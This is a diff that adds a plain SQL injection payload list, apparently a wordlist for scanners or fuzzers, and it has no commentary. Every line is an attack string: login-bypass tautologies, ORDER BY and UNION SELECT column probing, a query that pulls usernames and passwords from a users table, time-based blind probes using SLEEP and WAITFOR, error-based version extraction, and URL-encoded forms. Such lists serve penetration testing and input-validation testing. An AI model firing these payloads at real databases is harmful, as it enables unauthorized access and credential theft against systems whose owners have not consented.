@@ -1,0 +1,43 @@
+'
+"
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'#
+' OR '1'='1'/*
+' OR 1=1--
+' OR 1=1#
+" OR "1"="1
+" OR 1=1--
+or 1=1
+or 1=1--
+' OR ''='
+') OR ('1'='1
+')) OR (('1'='1
+admin'--
+admin'#
+admin'/*
+admin' OR '1'='1
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' ORDER BY 10--
+1' GROUP BY 1--
+1' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT username, password FROM users--
+1 AND 1=1
+1 AND 1=2
+1' AND '1'='1
+1' AND '1'='2
+1' AND SLEEP(5)--
+1' AND SLEEP(5)#
+1'; WAITFOR DELAY '0:0:5'--
+1 OR SLEEP(5)
+' OR SLEEP(5)--
+'||SLEEP(5)||'
+1) OR SLEEP(5)--
+' AND extractvalue(1,concat(0x7e,version()))--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+%27
+%27%20OR%20%271%27%3D%271
